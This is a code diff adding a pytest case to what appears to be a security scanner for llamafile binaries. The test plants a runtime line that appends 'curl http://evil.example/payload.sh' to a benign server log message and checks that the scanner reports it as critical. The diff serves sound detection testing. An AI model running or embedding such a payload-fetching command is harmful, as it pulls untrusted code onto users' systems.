@@ -99,6 +99,23 @@ def test_llamafile_scanner_allows_known_safe_runtime_fragments(tmp_path: Path) -
     assert runtime_issues == []
 
 
+def test_llamafile_scanner_flags_mixed_safe_fragment_and_command_tokens(tmp_path: Path) -> None:
+    binary = tmp_path / "mixed-fragment.llamafile"
+    binary.write_bytes(
+        _build_llamafile_blob(
+            runtime_lines=[
+                "INFO llama server listening on http://127.0.0.1:8080 ; curl http://evil.example/payload.sh",
+            ]
+        )
+    )
+
+    result = LlamafileScanner().scan(str(binary))
+
+    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
+    assert runtime_issues
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)
+
+
 def test_llamafile_scanner_handles_truncated_binary(tmp_path: Path) -> None:
     binary = tmp_path / "truncated.llamafile"
     binary.write_bytes(_build_llamafile_blob(embedded_payload=b""))
